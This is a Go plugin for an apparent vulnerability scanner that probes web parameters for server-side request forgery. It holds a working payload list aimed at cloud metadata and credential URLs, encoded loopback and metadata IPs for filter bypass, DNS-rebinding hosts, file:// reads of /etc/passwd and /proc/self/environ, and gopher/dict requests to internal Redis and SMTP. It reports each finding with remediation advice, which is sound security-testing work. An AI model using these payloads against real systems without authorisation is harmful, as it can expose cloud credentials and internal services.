package plugins

import (
	"DORM/models"
	"fmt"
	"io"
	"net/http"
	"strings"
)

// ==================================================
// SSRF — v2.0 "Cloud Phantom"
// Cloud Metadata · Gopher/Dict · Internal Probe
// DNS Rebinding · Alt IP Formats · OOB Collaborator
// Spider Integration
// ==================================================
type SSRFMetadataPlugin struct{}

func (p *SSRFMetadataPlugin) Name() string { return "SSRF Omni-Hunter v2 (Cloud/Gopher/OOB)" }

func (p *SSRFMetadataPlugin) Run(target models.ScanTarget) *models.Vulnerability {
	if !isWebPort(target.Port) {
		return nil
	}

	client := models.GetClient()
	baseURL := getURL(target, "")

	// ── Parametre listesi (25+) ──────────────────────────────────────────
	params := []string{
		"url", "uri", "link", "dest", "redirect", "src", "source", "file",
		"u", "r", "document", "path", "pg", "view", "callback", "image_url",
		"webhook", "endpoint", "proxy", "target", "host", "to", "forward",
		"return", "fetch", "load", "open", "read", "data",
	}

	// ── Payload tipi ─────────────────────────────────────────────────────
	type SSRFPayload struct {
		URL  string
		Sig  string
		Desc string
		CVSS float64
	}

	// ══════════════════════════════════════════════════════════════════════
	// PAYLOAD GROUPS
	// ══════════════════════════════════════════════════════════════════════

	// ── Group 1: Cloud Metadata (standard IP) ────────────────────────────
	cloudPayloads := []SSRFPayload{
		{"http://169.254.169.254/latest/meta-data/", "ami-id", "AWS EC2 Metadata (Standard)", 10.0},
		{"http://169.254.169.254/latest/user-data/", "#!/bin/bash", "AWS User-Data (Script)", 10.0},
		{"http://169.254.170.2/v2/credentials/", "AccessKeyId", "AWS ECS Task Credentials", 10.0},
		{"http://metadata.google.internal/computeMetadata/v1/", "Metadata-Flavor", "GCP Metadata (Header Leak)", 9.5},
		{"http://169.254.169.254/metadata/instance?api-version=2021-02-01", "Required HTTP header", "Azure Metadata (Header Leak)", 9.5},
		{"http://100.100.100.200/latest/meta-data/", "image-id", "Alibaba Cloud Metadata", 9.0},
		{"http://169.254.169.254/metadata/v1/", "droplet_id", "DigitalOcean Metadata", 9.0},
		{"http://192.0.0.192/latest/", "oracle", "Oracle Cloud Metadata", 9.0},
	}

	// ── Group 2: WAF Bypass — Alternative IP formats ───────────────────
	// 127.0.0.1 bypasses
	localhostBypass := []SSRFPayload{
		{"http://0x7f000001/", "localhost_marker", "Hex IP (127.0.0.1 → 0x7f000001)", 9.5},
		{"http://0177.0000.0000.0001/", "localhost_marker", "Octal IP (127.0.0.1 octal)", 9.5},
		{"http://2130706433/", "localhost_marker", "Decimal IP (127.0.0.1 → 2130706433)", 9.5},
		{"http://[::1]/", "localhost_marker", "IPv6 Localhost ([::1])", 9.5},
		{"http://[::ffff:127.0.0.1]/", "localhost_marker", "IPv4-Mapped IPv6 ([::ffff:127.0.0.1])", 9.5},
		{"http://[::]/", "localhost_marker", "IPv6 Zero ([::] — 0.0.0.0)", 9.0},
		{"http://0/", "localhost_marker", "Zero IP (0 — Linux'ta loopback)", 9.0},
		{"http://127%252e0%252e0%252e1/", "localhost_marker", "Double URL Encoded Dot Bypass", 9.0},
	}

	// 169.254.169.254 (AWS) bypasses
	awsBypass := []SSRFPayload{
		{"http://0xA9FEA9FE/", "ami-id", "AWS Metadata (Hex IP)", 10.0},
		{"http://2852039166/", "ami-id", "AWS Metadata (Decimal IP)", 10.0},
		{"http://0251.0376.0251.0376/latest/meta-data/", "ami-id", "AWS Metadata (Octal IP)", 10.0},
		{"http://[::ffff:a9fe:a9fe]/latest/meta-data/", "ami-id", "AWS Metadata (IPv6-Mapped)", 10.0},
	}

	// ── Group 3: DNS Rebinding / Wildcard DNS ────────────────────────────
	dnsBypass := []SSRFPayload{
		{"http://127.0.0.1.nip.io/", "localhost_marker", "DNS Rebinding via nip.io (127.0.0.1)", 9.5},
		{"http://127.0.0.1.xip.io/", "localhost_marker", "DNS Rebinding via xip.io (127.0.0.1)", 9.5},
		{"http://127-0-0-1.sslip.io/", "localhost_marker", "DNS Rebinding via sslip.io", 9.5},
		{"http://169.254.169.254.nip.io/latest/meta-data/", "ami-id", "AWS Metadata via nip.io DNS", 10.0},
		{"http://169.254.169.254.xip.io/latest/meta-data/", "ami-id", "AWS Metadata via xip.io DNS", 10.0},
	}

	// ── Group 4: LFI via file:// ─────────────────────────────────────────
	filePayloads := []SSRFPayload{
		{"file:///etc/passwd", "root:x:0:0", "Local File Inclusion (Linux /etc/passwd)", 9.0},
		{"file://C:/Windows/win.ini", "[fonts]", "Local File Inclusion (Windows win.ini)", 9.0},
		{"file:///proc/self/environ", "PATH=", "LFI via /proc/self/environ", 8.5},
	}

	// ── Group 5: Internal Service Probe ──────────────────────────────────
	internalPorts := []struct {
		Port int
		Sig  string
		Desc string
	}{
		{6379, "PONG", "Redis"},
		{9200, "\"version\"", "Elasticsearch"},
		{5432, "PostgreSQL", "PostgreSQL"},
		{3306, "mysql", "MySQL"},
		{8500, "consul", "Consul"},
		{2375, "\"ApiVersion\"", "Docker API"},
		{2379, "\"cluster_id\"", "etcd"},
		{8080, "Server", "Internal HTTP (8080)"},
	}

	internalPayloads := make([]SSRFPayload, 0, len(internalPorts))
	for _, svc := range internalPorts {
		internalPayloads = append(internalPayloads, SSRFPayload{
			URL:  fmt.Sprintf("http://127.0.0.1:%d/", svc.Port),
			Sig:  svc.Sig,
			Desc: fmt.Sprintf("Internal Service Probe: %s (127.0.0.1:%d)", svc.Desc, svc.Port),
			CVSS: 9.0,
		})
	}

	// ── Group 6: Gopher Protocol ─────────────────────────────────────────
	gopherPayloads := []SSRFPayload{
		{
			"gopher://127.0.0.1:6379/_PING%0d%0a",
			"+PONG",
			"Gopher Protocol → Redis PING (Internal Service Pivot)",
			9.5,
		},
		{
			"gopher://127.0.0.1:25/_HELO%20dorm%0d%0a",
			"220",
			"Gopher Protocol → SMTP HELO (Internal Mail Server Pivot)",
			9.0,
		},
		{
			"dict://127.0.0.1:6379/info",
			"redis_version",
			"Dict Protocol → Redis Info Leak",
			9.0,
		},
	}

	// ══════════════════════════════════════════════════════════════════════
	// HELPER FUNCTION: Try a single payload-param combination
	// ══════════════════════════════════════════════════════════════════════
	probe := func(param, payloadURL, sig, desc string, cvss float64) *models.Vulnerability {
		attackURL := fmt.Sprintf("%s/?%s=%s", baseURL, param, payloadURL)
		resp, err := client.Get(attackURL)
		if err != nil {
			return nil
		}
		bodyBytes, _ := io.ReadAll(io.LimitReader(resp.Body, 16384))
		resp.Body.Close()
		body := string(bodyBytes)

		// Direkt hit
		if resp.StatusCode == 200 && strings.Contains(body, sig) {
			return &models.Vulnerability{
				Target:   target,
				Name:     "SSRF Detected: " + desc,
				Severity: "CRITICAL",
				CVSS:     cvss,
				Description: fmt.Sprintf(
					"Server retrieved internal resource via '%s' parameter.\nPayload: %s\nProof: '%s' was found in the response.",
					param, payloadURL, sig,
				),
				Solution:  "Validate URL inputs against a whitelist. Disable file://, gopher://, dict:// schemas. Use IMDSv2 in cloud environments.",
				Reference: "CWE-918: Server-Side Request Forgery",
			}
		}

		// Cloud metadata error leak (GCP/Azure header missing error)
		if (resp.StatusCode == 400 || resp.StatusCode == 403) &&
			(strings.Contains(body, "Metadata-Flavor") || strings.Contains(body, "Required HTTP header")) {
			bodyPreview := body
			if len(bodyPreview) > 100 {
				bodyPreview = bodyPreview[:100]
			}
			return &models.Vulnerability{
				Target:   target,
				Name:     "SSRF Detected (Cloud Metadata Error Leak)",
				Severity: "HIGH",
				CVSS:     8.5,
				Description: fmt.Sprintf(
					"Server attempted to access cloud metadata endpoint (missing header error leaked).\nPayload: %s\nError Preview: %s",
					payloadURL, bodyPreview,
				),
				Solution:  "Block outgoing internal IP requests to the 169.254.x.x range. Harden metadata access with IMDSv2.",
				Reference: "CWE-918: Server-Side Request Forgery",
			}
		}
		return nil
	}

	// ══════════════════════════════════════════════════════════════════════
	// Scan all payload groups
	// ══════════════════════════════════════════════════════════════════════
	allGroups := [][]SSRFPayload{
		cloudPayloads,
		awsBypass,
		dnsBypass,
		filePayloads,
		internalPayloads,
		gopherPayloads,
	}

	for _, param := range params {
		for _, group := range allGroups {
			for _, pl := range group {
				if vuln := probe(param, pl.URL, pl.Sig, pl.Desc, pl.CVSS); vuln != nil {
					return vuln
				}
			}
		}
	}

	// ── Localhost bypass payloads — custom check ─────────────────────────
	// (For payloads with "localhost_marker" signature, the server
	//  returning any internal content is sufficient: 200 + non-empty body)
	for _, param := range params {
		for _, pl := range localhostBypass {
			attackURL := fmt.Sprintf("%s/?%s=%s", baseURL, param, pl.URL)
			resp, err := client.Get(attackURL)
			if err != nil {
				continue
			}
			bodyBytes, _ := io.ReadAll(io.LimitReader(resp.Body, 8192))
			resp.Body.Close()
			body := string(bodyBytes)

			// 200 + non-empty content + not the target site's own content
			if resp.StatusCode == 200 && len(body) > 50 && !strings.Contains(body, "<html") {
				return &models.Vulnerability{
					Target:   target,
					Name:     "SSRF: Localhost Bypass Detected",
					Severity: "CRITICAL",
					CVSS:     pl.CVSS,
					Description: fmt.Sprintf(
						"SSRF confirmed via localhost bypass technique.\nTechnique: %s\nPayload: %s\nParam: %s\nResponse Size: %d bytes",
						pl.Desc, pl.URL, param, len(body),
					),
					Solution:  "Block 127.0.0.1, 0.0.0.0, [::1] and all encoding variants except whitelisted ones.",
					Reference: "CWE-918: Server-Side Request Forgery",
				}
			}
		}
	}

	// ── OOB Collaborator (DORM Proxy) ───────────────────────────────────
	collabURL := ""
	if val, ok := models.SharedData.Load("collab_url"); ok {
		if s, ok := val.(string); ok && s != "" {
			collabURL = s
		}
	}

	if collabURL != "" {
		for _, param := range params[:5] { // First 5 parameters are sufficient
			attackURL := fmt.Sprintf("%s/?%s=%s", baseURL, param, collabURL)
			req, err := http.NewRequest("GET", attackURL, nil)
			if err != nil {
				continue
			}
			resp, err := client.Do(req)
			if err != nil {
				continue
			}
			resp.Body.Close()

			// OOB callback check: If request comes to collaborator server,
			// the external service performing this check writes "collab_hit" to SharedData
			if hitVal, hit := models.SharedData.Load("collab_hit"); hit {
				if hitParam, ok := hitVal.(string); ok && hitParam != "" {
					return &models.Vulnerability{
						Target:   target,
						Name:     "SSRF: OOB Callback Confirmed (DORM Collaborator)",
						Severity: "CRITICAL",
						CVSS:     10.0,
						Description: fmt.Sprintf(
							"SSRF definitively confirmed via Out-of-Band (OOB) callback.\nCallback received at collaborator URL.\nParam: %s\nCollaborator: %s\nProof: %s",
							param, collabURL, hitParam,
						),
						Solution:  "Filter outgoing HTTP requests based on a whitelist. Disable all external URL schemas.",
						Reference: "CWE-918: Server-Side Request Forgery",
					}
				}
			}
		}
	}

	// ── Spider Endpoint Integration ─────────────────────────────────────
	key := "endpoints_" + target.IP
	if existing, ok := models.SharedData.Load(key); ok {
		spiderEndpoints := existing.([]models.Endpoint)
		for _, ep := range spiderEndpoints {
			if ep.Method == "GET" && len(ep.Params) > 0 {
				for _, param := range ep.Params {
					// Is it an SSRF-sensitive parameter?
					if !containsAny(strings.ToLower(param),
						"url", "uri", "link", "dest", "redirect", "src", "source",
						"file", "fetch", "load", "open", "image", "proxy", "host") {
						continue
					}
					// Try the most critical payloads
					for _, pl := range cloudPayloads[:3] {
						if vuln := probe(param, pl.URL, pl.Sig, pl.Desc+" (Spider)", pl.CVSS); vuln != nil {
							vuln.Name += " (Spider-Discovered)"
							return vuln
						}
					}
				}
			}
		}
	}

	return nil
}
